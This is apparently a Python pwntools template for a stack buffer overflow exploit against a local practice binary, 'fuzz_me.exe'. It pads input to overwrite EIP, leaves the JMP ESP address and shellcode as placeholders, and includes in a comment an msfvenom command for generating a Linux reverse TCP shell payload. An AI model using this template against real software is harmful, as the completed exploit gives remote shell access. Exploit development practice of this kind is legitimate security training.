#!/usr/bin/python3


from pwn import *


context.update(arch="i386",os="linux")

p = process("./fuzz_me.exe")


# msfvenom -p linux/x86/shell_reverse_tcp -b '\x00\x0a\x0d' LHOST=127.0.0.1 LPORT=55555 -f python
buf =  b""
#### REPLACE



shellcode = buf

## Control EIP

buffer = b''
buffer += b'A'*253
buffer += p32(#JMP ESP) #EIP 
#NOPSLIDE TO ADD

# Exploit (the magic happen here)

exploit = buffer
exploit += shellcode


#gdb.attach(p,''' echo "hi" ''')

p.sendline("username")
p.sendline(b"COMMAND TO EXPLOIT" + exploit)
p.interactive()
